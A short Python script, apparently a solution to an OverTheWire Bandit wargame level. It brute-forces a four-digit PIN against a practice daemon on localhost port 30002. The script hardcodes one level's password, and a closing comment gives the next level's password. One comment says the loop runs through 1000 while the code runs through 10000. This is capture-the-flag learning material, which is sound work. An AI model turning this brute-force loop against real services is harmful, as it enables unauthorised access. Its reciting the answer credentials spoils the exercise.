# brute force to send 4 digit pin and password to daemon on port 30002


import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# opens the tcp connection
s.connect(("localhost",30002))
password="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

# loop throuhg 1000 for brute forcing pins
for pin in range(10000):
    guess=str(pin).zfill(4)
    
    message=f"{password} {guess}\n"
    s.send(message.encode())

    response=s.recv(1024).decode()
    print(response)

    if "Wrong" not in response:
        save=response
        print("Got it : ",save)
        break

# The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4